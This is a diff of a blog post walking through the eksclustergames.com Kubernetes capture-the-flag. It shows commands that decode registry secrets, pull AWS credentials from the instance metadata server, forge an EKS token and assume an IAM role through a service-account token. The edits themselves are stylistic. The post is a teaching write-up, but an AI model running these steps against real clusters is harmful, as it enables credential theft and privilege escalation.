@@ -7,7 +7,7 @@ tags:
     - Security
 title: eksclustergames.com walk through!
 ---
-[eksclustergames.com](https://eksclustergames.com) is a new CTF targetted at
+[eksclustergames.com](https://eksclustergames.com) is a new CTF targeted at
 kubernetes vulnerabilities. This is a walk through on how to solve the issues.
 
 # Challenge 1
@@ -18,7 +18,7 @@ Jumpstart your quest by listing all the secrets in the cluster.
 Can you spot the flag among them?
 ```
 
-So lets start off by getting the secrets:
+So let us start off by getting the secrets:
 
 ```bash
 ❯ kubectl get secret
@@ -26,7 +26,7 @@ NAME         TYPE     DATA   AGE
 log-rotate   Opaque   1      37h
 ```
 
-Since there is only one, lets view it!
+Since there is only one, let us view it!
 
 ```bash
 ❯ kubectl get secret -o json
@@ -78,7 +78,7 @@ For your convenience, the crane utility is already pre-installed on the machine.
 ```
 
 The first thing I think of when reading this is that it has something to do
-with the registry a pod is living on.   So lets list the pods and see what is
+with the registry a pod is living on.   So let us list the pods and see what is
 available:
 
 ```bash
@@ -87,16 +87,16 @@ NAME                    READY   STATUS    RESTARTS   AGE
 database-pod-2c9b3a4e   1/1     Running   0          36h
 ```
 
-With only one pod as a target, lets get the image for it:
+With only one pod as a target, let us get the image for it:
 
 ```bash
 ❯ kubectl get pod -o json |jq '.items[0].spec.containers[0].image'
 "eksclustergames/base_ext_image"
 ```
 
-So its on standard `docker.io` registry instead of a private one like I was
+So it is on standard `docker.io` registry instead of a private one like I was
 expecting from the clue.   The second hint was that crane is on the system so
-lets use that to pull the image and inspect it:
+let us use that to pull the image and inspect it:
 
 ```bash
 ❯ crane config eksclustergames/base_ext_image 
@@ -106,7 +106,7 @@ Error: fetching config: reading image "eksclustergames/base_ext_image": GET http
 Which means this is a private image and we are going to need to get some
 credentials to an account that has access to this image. Usually you have to
 define a secret for kubernetes to be able to pull from private registries and
-since we started off with a secret test first that is where I'm going to go 
+since we started off with a secret test first that is where I am going to go 
 next:
 
 ```bash
@@ -118,7 +118,7 @@ next:
 ]
 ```
 
-So that is the secret we need, lets view it:
+So that is the secret we need, let us view it:
 
 ```bash
 ❯ kubectl get secret registry-pull-secrets-780bab1d -o json |jq '.data.".dockerconfigjson"' -r|base64 -d|jq
@@ -131,7 +131,7 @@ So that is the secret we need, lets view it:
 }
 ```
 
-Looks like we've got some more base64 decoding for the actual auth credentials:
+Looks like we have got some more base64 decoding for the actual auth credentials:
 
 ```bash
 ❯ echo "ZWtzY2x1c3RdhbWVzOmRj<*REDACTED*>200bHI0NWlZ4RnVDbw==" | base64 -d
@@ -202,7 +202,7 @@ Looks like they leaked the secret right there in the image layers:
 wiz_eks_challenge{nothing_can_be_said_to_*REDACTED*}'
 ```
 
-So lets submit that and move onto the next one!
+So let us submit that and move onto the next one!
 
 # Challenge 3
 The hint is:
@@ -214,11 +214,11 @@ inspect the image layers, and uncover the hidden secret.
 Remember: You are running inside a compromised EKS pod.
 ```
 
-This sounds very similar to the last one but with the hints that its on ECR and
-that we are in the pod itself it makes me believe we'll have something like IRSA
+This sounds very similar to the last one but with the hints that it is on ECR and
+that we are in the pod itself it makes me believe we will have something like IRSA
 access to AWS from the pod and need to use that to get to it.
 
-First lets check what pods we are working with:
+First let us check what pods we are working with:
 
 ```bash
 ❯ kubectl get pod
@@ -226,7 +226,7 @@ NAME                      READY   STATUS    RESTARTS   AGE
 accounting-pod-876647f8   1/1     Running   0          37h
 ```
 
-So same as the last challenge, lets get the image and see what access we have:
+So same as the last challenge, let us get the image and see what access we have:
 
 ```bash
 ❯ kubectl get pod -o json |jq '.items[0].spec.containers[0].image'
@@ -240,7 +240,7 @@ Which as expected, we do not have access to:
 Error: fetching config: reading image "688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c@sha256:7486d05d33ecb1c6e1c796d59f63a336cfa8f54a3cbc5abf162f533508dd8b01": GET https://688655246681.dkr.ecr.us-west-1.amazonaws.com/v2/central_repo-aaf4a7c/manifests/sha256:7486d05d33ecb1c6e1c796d59f63a336cfa8f54a3cbc5abf162f533508dd8b01: unexpected status code 401 Unauthorized: Not Authorized
 ```
 
-Since I expect the pod already has AWS access, lets check if the AWS CLI works:
+Since I expect the pod already has AWS access, let us check if the AWS CLI works:
 
 ```bash
 ❯ aws sts get-caller-identity
@@ -248,7 +248,7 @@ Since I expect the pod already has AWS access, lets check if the AWS CLI works:
 Unable to locate credentials. You can configure credentials by running "aws configure".
 ```
 
-Credentials are not configured right now, so we need to discover them.  Lets
+Credentials are not configured right now, so we need to discover them.  Let us
 check if we have metadata server access:
 
 ```bash
@@ -270,7 +270,7 @@ to AWS:
 }
 ```
 
-Lets set those as environment variables to activate our AWS access:
+Let us set those as environment variables to activate our AWS access:
 
 ```bash
 export AWS_ACCESS_KEY_ID="ASIA2AVYNE<*REDACTED*"
@@ -293,7 +293,7 @@ Now we should be able to authenticate crane and inspect the image from ECR:
 2023/11/03 02:56:41 logged in via /home/user/.docker/config.json
 ```
 
-Lets get those layers!
+Let us get those layers!
 
 ```bash
 ❯ crane config 688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c@sha256:7486d05d33ecb1c6e1c796d59f63a336cfa8f54a3cbc5abf162f533508dd8b01|jq
@@ -363,8 +363,8 @@ no permissions. Can you navigate your way to access the EKS Node's privileged
 service-account?
 ```
 
-This sounds like we're going to need to escalate our privileges through the AWS
-access we acquired in the last challenge. Lets start with inspecting the
+This sounds like we are going to need to escalate our privileges through the AWS
+access we acquired in the last challenge. Let us start with inspecting the
 environment again:
 
 ```bash
@@ -372,7 +372,7 @@ environment again:
 Error from server (Forbidden): pods is forbidden: User "system:serviceaccount:challenge4:service-account-challenge4" cannot list resource "pods" in API group "" in the namespace "challenge4"
 ```
 
-So we don't even have access to list pods!   Do we have any access?
+So we do not even have access to list pods!   Do we have any access?
 
 ```bash
 ❯ kubectl auth can-i --list
@@ -403,7 +403,7 @@ podsecuritypolicies.policy                      []                              
 
 That is *very* minimal access. So we are going to have to try get a token using
 the escalated privileges.  Usually we could use `aws eks get-token` but that
-requires knowing the cluster name and I don't know that.   Lets try to list the
+requires knowing the cluster name and I do not know that.   Let us try to list the
 clusters:
 
 ```bash
@@ -412,22 +412,22 @@ clusters:
 An error occurred (AccessDeniedException) when calling the ListClusters operation: User: arn:aws:sts::688655246681:assumed-role/eks-challenge-cluster-nodegroup-NodeInstanceRole/i-0cb922c6673973282 is not authorized to perform: eks:ListClusters on resource: arn:aws:eks:us-west-1:688655246681:cluster/*
 ```
 
-So they haven't given us much to go on at all here.  The role itself *might* be
+So they have not given us much to go on at all here.  The role itself *might* be
 a clue but that is relying on them being consistent with their naming:
 
 ```
 arn:aws:sts::688655246681:assumed-role/eks-challenge-cluster-nodegroup-NodeInstanceRole/
 ```
 
-The cluster name *might* be `eks-challenge-cluster` based on that but I can't
-guarantee that. Lets check its security groups:
+The cluster name *might* be `eks-challenge-cluster` based on that but I cannot
+guarantee that. Let us check its security groups:
 
 ```bash
 ❯ curl -sS http://169.254.169.254/latest/meta-data/security-groups;echo
 eks-cluster-sg-eks-challenge-cluster-963543728
 ```
 
-The name is there again.  I don't feel good about not having more details but it
+The name is there again.  I do not feel good about not having more details but it
 is at least worth trying it:
 
 ```bash
@@ -443,7 +443,7 @@ is at least worth trying it:
 }
 ```
 
-This gets us a token, so lets try to use it:
+This gets us a token, so let us try to use it:
 
 ```bash
 ❯ export TOKEN=$(aws eks get-token --cluster-name eks-challenge-cluster|jq '.status.token' -r)
@@ -523,7 +523,7 @@ AWS account.
 Can you acquire the AWS role of the s3access-sa service account, and get the flag?
 ```
 
-So lets start with checking what access we do have:
+So let us start with checking what access we do have:
 
 ```bash
 ❯ kubectl whoami
@@ -571,7 +571,7 @@ podsecuritypolicies.policy                      []                  [eks.privile
 ```
 
 Hmm, being able to create tokens for the `debug-sa` resource definitely seems
-suspicious. So lets see if that will get us anywhere:
+suspicious. So let us see if that will get us anywhere:
 
 ```bash
 ❯ export TOKEN=$(kubectl create token debug-sa)
@@ -601,7 +601,7 @@ selfsubjectrulesreviews.authorization.k8s.io    []                              
 podsecuritypolicies.policy                      []                                    [eks.privileged]   [use]
 ```
 
-Looks like we have less access than before.  So not too helpful, lets take a
+Looks like we have less access than before.  So not too helpful, let us take a
 look at that service account we want to become:
 
 ```bash
@@ -622,7 +622,7 @@ look at that service account we want to become:
 }
 ```
 
-I think we are going to need to use our AWS access to assume that role, I don't
+I think we are going to need to use our AWS access to assume that role, I do not
 believe our kubernetes access is going to get us anywhere:
 
 ```bash
@@ -631,8 +631,8 @@ believe our kubernetes access is going to get us anywhere:
 An error occurred (AccessDenied) when calling the AssumeRole operation: User: arn:aws:sts::688655246681:assumed-role/eks-challenge-cluster-nodegroup-NodeInstanceRole/i-0cb922c6673973282 is not authorized to perform: sts:AssumeRole on resource: arn:aws:iam::688655246681:role/challengeEksS3Role
 ```
 
-Ok, so *maybe* our kubernetes access is important since we can't assume the role
-directly.   Lets try to use that $TOKEN from `debug-sa` to assume the role:
+Ok, so *maybe* our kubernetes access is important since we cannot assume the role
+directly.   Let us try to use that $TOKEN from `debug-sa` to assume the role:
 
 ```bash
 ❯ aws sts assume-role-with-web-identity --role-arn arn:aws:iam::688655246681:role/challengeEksS3Role --role-session-name test --web-identity-token $TOKEN
@@ -641,7 +641,7 @@ An error occurred (InvalidIdentityToken) when calling the AssumeRoleWithWebIdent
 ```
 
 Getting closer!   The default audience for a token created with `kubectl` is
-`https://kubernetes.default.svc` which amazon doesn't seem to like.  Lets try
+`https://kubernetes.default.svc` which amazon does not seem to like.  Let us try
 creating it again with `sts.amazonaws.com`:
 
 ```bash
@@ -664,7 +664,7 @@ creating it again with `sts.amazonaws.com`:
 }
 ```
 
-Success!  We have some new AWS credentials.  Lets setup our new AWS Session:
+Success!  We have some new AWS credentials.  Let us setup our new AWS Session:
 
 ```bash
 ❯ export AWS_ACCESS_KEY_ID="ASIA2AVYNEV<*REDACTED*>"
@@ -713,5 +713,5 @@ download: s3://challenge-flag-bucket-3ff1ae2/flag to ./flag
 wiz_eks_challenge{w0w_y0u_really_are_4n_eks_and_aws<*REDACTED*>}
 ```
 
-and thats the final flag! In my next post I'll discuss the remediation steps
-to prevent this configuration mistakes on your cluster!
+and that is the final flag! In my next post I will discuss the remediation steps
+to prevent these configuration mistakes on your cluster!
